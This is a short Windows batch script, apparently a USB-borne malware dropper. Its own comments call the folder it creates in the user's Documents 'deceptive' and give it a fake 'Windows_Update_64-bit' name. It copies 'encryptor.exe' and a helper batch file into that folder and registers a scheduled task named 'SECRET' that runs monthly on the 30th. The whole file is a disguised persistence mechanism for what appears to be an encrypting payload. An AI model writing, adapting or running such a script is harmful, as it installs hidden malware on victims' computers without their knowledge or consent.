@echo off

Rem This script makes a deceptive folder in the user's documents, copies all of the required files from the USB stick to that folder and then creates a task
Rem The task will run on the 30th of the month, and will execute the Task.bat file.

mkdir C:\Users\%USERNAME%\Documents\Windows_Update_64-bit
xcopy /s "encryptor.exe" "C:\Users\%USERNAME%\Documents\Windows_Update_64-bit"
xcopy /s "TaskRemoval.bat" "C:\Users\%USERNAME%\Documents\Windows_Update_64-bit"
SCHTASKS /CREATE /SC MONTHLY /D 30 /TN "WINDOWSTASKS\SECRET" /TR "C:\Users\%USERNAME%\Documents\Windows_Update_64-bit\Task.bat" /ST 12:00